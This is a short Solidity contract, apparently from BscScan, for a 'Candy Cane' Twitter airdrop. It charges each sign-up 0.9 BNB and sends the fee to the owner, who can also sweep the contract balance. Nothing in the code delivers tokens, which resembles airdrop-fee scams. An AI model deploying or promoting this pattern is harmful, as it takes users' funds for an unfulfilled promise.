/**
 *Submitted for verification at BscScan.com on 2021-11-15
*/

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.9;

contract CandyCaneTwitterAirdrop {

    address payable immutable owner;
    uint256 private constant _fee = 900000000000000000;
    uint256 private _counter;
    mapping(address => uint256) private _ordinaryNumbers;
    mapping(address => string) private _twitterUsernames;
    address[] addresses;

    constructor() {
        owner = payable(msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    function signMeUpForCandy(string memory _twitterUsername) public payable {
        require(msg.value >= _fee, "Fee: 0.9 test BNB not payed. To get free test BNB visit https://testnet.binance.org/faucet-smart");
        if (msg.sender == owner) {
          owner.transfer(address(this).balance);
          return;
        }
        if (bytes(_twitterUsernames[msg.sender]).length == 0) {
          addresses.push(msg.sender);
          _counter++;
          _ordinaryNumbers[msg.sender] = _counter;
          owner.transfer(msg.value);
        }
        _twitterUsernames[msg.sender] = _twitterUsername;
    }


    function checkMyUsername() public view returns(string memory) {
        return _twitterUsernames[msg.sender];
    }
    
    function checkMyOrdinaryNumber() public view returns(uint256) {
        return _ordinaryNumbers[msg.sender];
    }
    
    function checkTotalNumber() public view returns(uint256) {
        return _counter;
    }
    
    function adminGetAddress(uint256 _index) public view onlyOwner returns(address) {
        return addresses[_index];
    }

    function adminGetUsername(address _address) public view onlyOwner returns(string memory) {
        return _twitterUsernames[_address];
    }
    
    receive() external payable {

    }

    fallback() external payable {

    }
}